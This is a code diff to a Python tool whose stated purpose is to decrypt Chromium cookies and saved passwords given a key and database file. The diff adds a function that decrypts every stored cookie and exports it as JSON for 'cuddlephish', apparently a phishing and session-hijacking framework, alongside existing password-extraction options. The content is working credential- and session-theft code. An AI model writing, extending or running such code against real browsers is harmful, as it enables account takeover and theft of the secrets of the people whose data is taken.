@@ -85,6 +85,56 @@ def login_data(key, file_location):
         print(e)
         sys.exit(1)
 
+def cookies_for_cuddlephish(key, file_location):
+    cookies = []
+    if os.path.isfile(file_location) == False:
+        print("Error: File does not exist")
+        sys.exit(1)
+    try:
+        priority_map = {1: "Medium", 2: "High"}
+        conn = sqlite3.connect(file_location)
+        cursor = conn.cursor()
+        cursor.execute('select creation_utc, host_key, top_frame_site_key, name, CAST(encrypted_value AS BLOB), path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, last_update_utc, source_type, has_cross_site_ancestor from cookies')
+        values = cursor.fetchall()
+        
+        for creation_utc, host_key, top_frame_site_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, last_update_utc, source_type, has_cross_site_ancestor in values:
+            decrypted_value = decrypt_data(encrypted_value, key)
+            expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
+            cookie = {
+                'creation_utc': creation_utc,
+                'domain': host_key,
+                'top_frame_site_key': top_frame_site_key,
+                'name': name,
+                'value': decrypted_value, 
+                'path': path,
+                'expires_utc': expiration_date,
+                'is_secure': bool(is_secure),
+                'is_httponly': bool(is_httponly),
+                'last_access_utc': last_access_utc,
+                'has_expires': has_expires,
+                'is_persistent': is_persistent,
+                'priority': priority_map.get(priority, "Medium"),
+                "size": len(name) + len(decrypted_value),
+                'source_port': source_port,
+                'last_update_utc': last_update_utc,
+                'source_type': source_type
+            }
+            cookies.append(cookie)
+        
+        output = {
+            "url": "https://google.com",
+            "cookies": cookies,
+            "local_storage": []
+        }
+        cookie_file_name = "cuddlephish_" +datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".json"
+        with open(cookie_file_name, 'w') as f:
+            json.dump(output, f, indent=4)
+        print("Cookies saved to " + cookie_file_name)
+    except sqlite3.Error as e:
+        print("Error: Could not connect to database")
+        print(e)
+        sys.exit(1)
+
 def decrypt_data(encrypted_junk, key):
     #key = binascii.unhexlify(key)
     version = encrypted_junk[:3]
@@ -122,7 +172,7 @@ def decrypt_data(encrypted_junk, key):
 def argparse_args():
     parser = argparse.ArgumentParser(description='Decrypt Chromium cookies and passwords given a key and DB file')
     parser.add_argument('-k', '--key', help='Decryption key', required=True)
-    parser.add_argument('-o','--option', choices=['cookies', 'passwords', 'cookie-editor', 'firefox'], help='Option to choose', required=True)
+    parser.add_argument('-o','--option', choices=['cookies', 'passwords', 'cookie-editor', 'cuddlephish', 'firefox'], help='Option to choose', required=True)
     parser.add_argument('-f','--file', help='Location of the database file', required=True)
     return parser.parse_args()
 
@@ -166,6 +216,8 @@ def main():
         login_data(key, file_location)
     elif option == "cookie-editor":
         cookies_for_editor(key, file_location)
+    elif option == "cuddlephish":
+        cookies_for_cuddlephish(key, file_location)
     elif option == "firefox":
         print("TO DO")
     else:
